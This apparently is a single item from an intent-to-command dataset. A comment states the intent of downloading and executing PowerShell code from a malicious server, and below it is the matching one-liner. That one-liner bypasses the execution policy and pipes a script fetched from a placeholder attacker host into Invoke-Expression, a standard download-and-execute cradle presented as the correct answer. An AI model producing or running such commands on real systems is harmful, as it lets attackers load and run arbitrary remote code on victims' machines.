# Natural language intent:
# Download and execute PowerShell code from a potentially malicious server.

powershell.exe -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious-server.example.com/hack_script')"
